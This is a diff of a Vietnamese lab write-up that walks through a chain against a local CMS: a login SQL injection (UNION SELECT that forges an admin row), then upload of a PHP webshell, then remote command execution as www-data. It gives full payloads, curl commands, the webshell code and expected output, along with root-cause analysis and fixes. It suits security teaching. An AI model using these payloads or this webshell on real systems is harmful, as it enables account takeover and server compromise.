@@ -1,106 +1,151 @@
-﻿# Hướng 4: SQLi -> Admin Takeover -> Upload PHP -> RCE
+## Hướng 4. SQLi Admin Takeover Upload RCE
 
-> Chỉ sử dụng trong lab local `BlueMarket CMS`. Hướng này minh họa RCE gián tiếp ở tầng ứng dụng sau khi chiếm quyền admin.
+### Mô tả
 
-## 1. Vị trí lỗi trong app
-
-Chuỗi này có hai phần:
+BlueMarket CMS có trang login và khu vực admin:
 
 ```text
-Phần takeover:
-Route: /login
-Code: app/src/Controllers/AuthController.php
-
-Phần RCE:
-Route: /admin/media
-Code: app/src/Services/UploadService.php
-Output: /uploads/shell.php
+Login route: /login
+Admin route: /admin
+Media upload route: /admin/media
 ```
 
-Đoạn login vulnerable:
+Hướng này không dùng primitive RCE trực tiếp từ database. Thay vào đó, SQL Injection ở login được dùng để tạo session admin giả, sau đó abuse chức năng upload media để upload PHP webshell.
+
+Các file liên quan:
+
+```text
+app/src/Controllers/AuthController.php
+app/src/Controllers/AdminController.php
+app/src/Services/UploadService.php
+```
+
+Login vulnerable:
 
 ```php
 $user = $db->queryOne("SELECT * FROM users WHERE username = '" . $username . "'");
 ```
 
-Đoạn upload vulnerable:
+Với login bình thường `username=admin`, query thực tế là:
+
+```sql
+SELECT * FROM users WHERE username = 'admin'
+```
+
+Sau khi query trả về một row, `AuthController` kiểm tra password rồi lấy các
+giá trị `id`, `username`, `email` và `role` từ row đó để tạo `$_SESSION['user']`.
+Vì vậy chain này có hai giai đoạn riêng: làm query trả về row giả, rồi dùng
+role `admin` trong session để đi tới chức năng upload.
+
+Upload vulnerable:
 
 ```php
 if ($mode === 'fixed') {
-    // Chỉ fixed mode mới kiểm tra extension.
+    $allowed = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
 }
 
 move_uploaded_file((string) $file['tmp_name'], $target);
 ```
 
-Ý tưởng:
+Trong vulnerable mode, upload không chặn extension `.php`.
+
+#### Phân tích source và điều kiện cần
+
+Chain này đi qua hai trust boundary khác nhau:
 
 ```text
-SQLi trong login
--> UNION SELECT tạo row admin giả
--> app tin row đó là user admin
--> vào /admin/media
--> upload shell.php
--> gọi /uploads/shell.php?cmd=id
--> RCE
+AuthController::login()
+-> username được ghép vào SELECT users
+-> row trả về được passwordMatches() kiểm tra
+-> id, email và role của row được ghi vào $_SESSION['user']
+-> is_admin()/requireAdmin() tin role trong session
+-> AdminController::uploadMedia()
+-> UploadService::store() dùng filename để tạo target path
+-> Nginx chuyển file .php trong uploads cho PHP-FPM
 ```
 
-## 2. Thử login bình thường
-
-```powershell
-cd D:\SQL-lead-to-RCE\blue-market-lab
-curl.exe -c admin.txt --data-urlencode "username=admin" --data-urlencode "password=admin123" http://localhost:5000/login
-curl.exe -b admin.txt "http://localhost:5000/admin"
-Remove-Item -Force admin.txt
-```
-
-Kỳ vọng: admin dashboard hiển thị.
-
-## 3. Thử SQLi cơ bản trên login
-
-Payload username:
-
-```text
-'
-```
-
-Gửi request:
-
-```powershell
-curl.exe --data-urlencode "username='" --data-urlencode "password=test" http://localhost:5000/login
-```
-
-Nếu vulnerable mode, query đang bị nối chuỗi và có thể trả lỗi SQL syntax.
-
-Query bị vỡ:
-
-```sql
-SELECT * FROM users WHERE username = '''
-```
-
-## 4. Hiểu cấu trúc UNION SELECT
-
-Bảng `users` có 7 cột:
-
-```text
-id
-username
-email
-password_hash
-role
-description
-created_at
-```
-
-Login code lấy user row và so sánh password:
+Source login:
 
 ```php
-password_verify($password, $stored) || hash_equals($stored, $password)
+$user = $db->queryOne("SELECT * FROM users WHERE username = '" . $username . "'");
+
+if (!$user || !$this->passwordMatches($password, (string) $user['password_hash'])) {
+    \redirect('/login');
+}
+
+$_SESSION['user'] = [
+    'id' => (int) $user['id'],
+    'role' => $user['role'],
+];
 ```
 
-Vì app lab cho phép so sánh plain text bằng `hash_equals`, ta có thể tạo row giả:
+Source upload:
+
+```php
+$name = basename((string) $file['name']);
+$target = $this->dir . '/' . $name;
+
+if ($mode === 'fixed') {
+    $allowed = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
+    // extension không nằm trong allow-list sẽ bị từ chối
+}
+
+move_uploaded_file((string) $file['tmp_name'], $target);
+```
+
+Chain chỉ thực hiện được khi các điều kiện sau cùng đúng:
+
+```text
+1. APP_MODE=vulnerable để login dùng string concatenation.
+2. UNION SELECT cung cấp đúng 7 cột của bảng users.
+3. passwordMatches() còn fallback hash_equals() cho plaintext trong lab.
+4. Row giả có role=admin và role đó được ghi vào session.
+5. Session takeover được gửi lại khi truy cập /admin/media.
+6. Upload service chấp nhận filename có đuôi .php.
+7. public/uploads có quyền ghi và nằm dưới document root.
+8. Nginx/PHP-FPM cho phép thực thi PHP trong thư mục uploads.
+```
+
+Chỉ có SQLi thì chưa đủ để RCE ở Hướng 4: SQLi tạo session admin, còn upload
+không kiểm soát và PHP execution mới là bước biến quyền admin thành code
+execution.
+
+Chain khai thác:
+
+```text
+SQL Injection trong /login
+-> UNION SELECT tạo row admin giả
+-> password gửi lên khớp với password_hash giả
+-> app tạo session role=admin
+-> truy cập /admin/media
+-> upload shell.php
+-> gọi /uploads/shell.php?cmd=id
+-> RCE dưới quyền www-data
+```
+
+### Phân tích và khai thác
+**Source tại bước này:** `AuthController::login()` nối trực tiếp `username` vào
+câu truy vấn:
+
+```php
+$user = $db->queryOne("SELECT * FROM users WHERE username = '" . $username . "'");
+```
+
+![alt text](image-16.png)
+
+Vì vậy có thể đóng dấu nháy hiện tại rồi chèn một row admin giả bằng `UNION SELECT`.
+Bảng `users` có 7 cột nên payload cũng phải trả đủ 7 giá trị:
 
 ```sql
+' UNION SELECT 999,'owned','owned@bluemarket.local','ownedpass','admin','Injected admin row',CURRENT_TIMESTAMP-- -
+```
+
+Sau khi ứng dụng nối payload vào source, PostgreSQL nhận được:
+
+```sql
+SELECT *
+FROM users
+WHERE username = ''
 UNION SELECT
     999,
     'owned',
@@ -109,200 +154,164 @@ UNION SELECT
     'admin',
     'Injected admin row',
     CURRENT_TIMESTAMP
+-- -'
 ```
 
-Nếu gửi password là:
+- Dấu `'` đầu tiên đóng chuỗi `username` của ứng dụng.
+- `UNION SELECT` thêm row có `role='admin'`; `-- -` vô hiệu hóa dấu nháy còn dư.
+- Gửi `password=ownedpass` để vượt qua kiểm tra mật khẩu fallback của lab.
+- Ứng dụng tạo session với `role=admin`, sau đó `requireAdmin()` cho phép truy cập `/admin/media`.
 
-```text
+![alt text](image-20.png)
+
+```
+' UNION SELECT 999,'owned','owned@bluemarket.local','ownedpass','admin','Injected admin row',CURRENT_TIMESTAMP-- -
+
 ownedpass
 ```
 
-thì login thành công với role:
+Nếu thành công, response redirect vào `/admin` và trả session cookie.
 
-```text
-admin
-```
+Tiếp theo tạo PHP webshell:
 
-## 5. Xây dựng payload takeover từng phần
-
-### 5.1. Đóng chuỗi username
-
-Query gốc:
-
-```sql
-SELECT * FROM users WHERE username = '<username>'
-```
-
-Username bắt đầu:
-
-```sql
-'
-```
-
-Kết quả:
-
-```sql
-WHERE username = ''
-```
-
-### 5.2. Thêm UNION SELECT row admin giả
-
-```sql
-UNION SELECT 999,'owned','owned@bluemarket.local','ownedpass','admin','Injected admin row',CURRENT_TIMESTAMP
-```
-
-### 5.3. Comment phần còn lại
-
-```sql
---
-```
-
-## 6. Payload takeover hoàn chỉnh
-
-```powershell
-$payload = @'
-' UNION SELECT 999,'owned','owned@bluemarket.local','ownedpass','admin','Injected admin row',CURRENT_TIMESTAMP--
-'@
-
-curl.exe -c takeover.txt --data-urlencode "username=$payload" --data-urlencode "password=ownedpass" http://localhost:5000/login
-```
-
-Kiểm tra quyền admin:
-
-```powershell
-curl.exe -b takeover.txt "http://localhost:5000/admin"
-```
-
-Nếu thấy dashboard, SQLi đã dẫn tới admin takeover.
-
-## 7. Tạo webshell PHP
-
-Tạo file local:
-
-```powershell
-Set-Content -Path .\shell.php -Encoding ASCII -Value '<?php system($_GET["cmd"] ?? "id"); ?>'
-```
-
-Nội dung file:
+**Source tại bước này:** SQLi đã kết thúc ở bước tạo session. Request tiếp theo
+đi qua `requireAdmin()`, `AdminController::uploadMedia()` và
+`UploadService::store()`. Ở vulnerable mode, service giữ filename bằng
+`basename()` nhưng không allow-list extension, nên file `.php` được lưu vào
+webroot.
 
 ```php
 <?php system($_GET["cmd"] ?? "id"); ?>
 ```
 
-Giải thích:
+Đây không còn là SQL payload. Sau khi đã có session admin, request multipart
+đưa file vào `AdminController::uploadMedia()`, rồi `UploadService::store()`
+dùng `basename($file['name'])` để giữ tên `shell.php`. Ở vulnerable mode không
+có allow-list extension, nên file được ghi vào `public/uploads`.
+
+Upload service lấy file name bằng basename():
+
+```php
+$name = basename((string) $file['name']);
+$target = $this->dir . '/' . $name;
+move_uploaded_file((string) $file['tmp_name'], $target);
+```
+
+
 
 ```text
-system($_GET["cmd"]) lấy lệnh từ query string.
+/var/www/html/public/uploads/shell.php
 ```
 
-## 8. Upload webshell bằng session admin vừa takeover
+Sau khi upload, mở:
 
-```powershell
-curl.exe -b takeover.txt -F "media=@shell.php;type=image/png" http://localhost:5000/admin/media
+```http
+GET /uploads/shell.php?cmd=id HTTP/1.1
+Host: localhost:5000
 ```
 
-Giải thích:
+Nginx map `/uploads/shell.php` vào document root và chuyển file `.php` cho
+PHP-FPM. PHP thực thi `system($_GET["cmd"] ?? "id")`, nên `cmd=id` mới là
+bước chứng minh RCE dưới quyền process web `www-data`.
+
+Kết quả mong đợi:
 
 ```text
-Vulnerable mode không kiểm tra extension/MIME chặt chẽ.
-File tên shell.php được lưu vào /var/www/html/public/uploads/shell.php.
-Nginx cấu hình để PHP-FPM xử lý file .php.
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Kiểm tra file trong container:
+![alt text](image-huong-4-07-rce-id.png)
 
-```powershell
-docker compose exec web ls -l /var/www/html/public/uploads/shell.php
+Thử thêm các lệnh an toàn:
+
+```http
+GET /uploads/shell.php?cmd=whoami HTTP/1.1
+Host: localhost:5000
 ```
 
-## 9. Kích hoạt RCE
-
-Chạy `id`:
-
-```powershell
-curl.exe "http://localhost:5000/uploads/shell.php?cmd=id"
+```http
+GET /uploads/shell.php?cmd=pwd HTTP/1.1
+Host: localhost:5000
 ```
 
-Chạy `whoami`:
-
-```powershell
-curl.exe "http://localhost:5000/uploads/shell.php?cmd=whoami"
+```http
+GET /uploads/shell.php?cmd=hostname HTTP/1.1
+Host: localhost:5000
 ```
 
-Chạy `hostname`:
+![alt text](image-huong-4-08-rce-other-commands.png)
 
-```powershell
-curl.exe "http://localhost:5000/uploads/shell.php?cmd=hostname"
-```
-
-Chạy `pwd`:
-
-```powershell
-curl.exe "http://localhost:5000/uploads/shell.php?cmd=pwd"
-```
-
-Kết quả mẫu:
+Chuỗi này khác hướng 2 và hướng 3:
 
 ```text
-www-data
+Hướng 2: SQLi -> PostgreSQL Large Object -> native extension -> reverse shell
+Hướng 3: SQLi -> COPY FROM PROGRAM -> command execution trong DBMS
+Hướng 4: SQLi -> admin takeover -> abuse upload feature -> PHP webshell
 ```
 
-## 10. Chuỗi giải thích khi báo cáo
-
-```text
-Login nối username vào SQL
--> attacker dùng UNION SELECT tạo user admin giả
--> app tạo session role=admin
--> admin có quyền vào Media Library
--> upload shell.php
--> Nginx/PHP-FPM thực thi shell.php
--> cmd query string được chạy bởi process web
--> RCE ở tầng ứng dụng
-```
-
-Khác với hướng 2 và 3:
-
-```text
-Hướng 2/3: SQLi -> DBMS primitive -> RCE
-Hướng 4: SQLi -> app privilege takeover -> app feature abuse -> RCE
-```
-
-## 11. Cleanup
+Sau khi demo xong, cleanup:
 
 ```powershell
-Remove-Item -Force .\shell.php
-Remove-Item -Force takeover.txt
 docker compose exec web rm -f /var/www/html/public/uploads/shell.php
 ```
 
-## 12. Điều kiện để thành công
+Nếu có file local `shell.php` hoặc cookie test thì xóa thêm:
 
-```text
-1. APP_MODE=vulnerable.
-2. Login query nối username trực tiếp vào SQL.
-3. UNION SELECT trả về row có role admin.
-4. Password gửi lên khớp với password_hash plain text trong row giả.
-5. Session admin được tạo.
-6. UploadService vulnerable cho phép lưu shell.php.
-7. Nginx/PHP-FPM thực thi file .php trong uploads.
+```powershell
+Remove-Item -Force .\shell.php -ErrorAction SilentlyContinue
+Remove-Item -Force .\takeover.txt -ErrorAction SilentlyContinue
 ```
 
-## 13. Fixed mode chặn ở đâu
+![alt text](image-huong-4-09-cleanup.png)
 
-Trong fixed mode:
+### Root cause
+
+Chain này ghép từ hai lỗi chính.
+
+Lỗi thứ nhất là SQL Injection ở login:
+
+```text
+1. username do user kiểm soát.
+2. username được nối trực tiếp vào SQL.
+3. UNION SELECT có thể tạo row giả.
+4. app tin row trả về từ database là user thật.
+5. role=admin trong row giả được đưa vào session.
+```
+
+Lỗi thứ hai là upload không kiểm soát extension trong vulnerable mode:
+
+```text
+1. Admin có quyền upload media.
+2. Server dùng filename từ user.
+3. Không chặn extension .php.
+4. File được lưu trong public/uploads.
+5. Nginx/PHP-FPM xử lý file .php trong uploads.
+6. Webshell được thực thi khi truy cập qua HTTP.
+```
+
+Trong fixed mode, login dùng parameterized query:
 
 ```php
 $user = $db->paramsOne('SELECT * FROM users WHERE username = $1', [$username]);
 ```
 
-Username chỉ là data, không thể `UNION SELECT`.
+Username chỉ còn là dữ liệu, không thể `UNION SELECT`.
 
-Upload fixed mode chỉ nhận extension media:
+Upload fixed mode chỉ cho phép media extension:
 
 ```php
 $allowed = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
 ```
 
-File `shell.php` bị từ chối.
+File `shell.php` sẽ bị từ chối.
 
+Tóm tắt root cause:
 
+```text
+1. SQL Injection trong login.
+2. Session role lấy trực tiếp từ row query trả về.
+3. Password fallback cho phép plaintext trong lab.
+4. Upload thiếu allow-list extension ở vulnerable mode.
+5. Webroot cho phép execute file upload.
+6. Thiếu tách biệt giữa file upload và PHP runtime.
+```
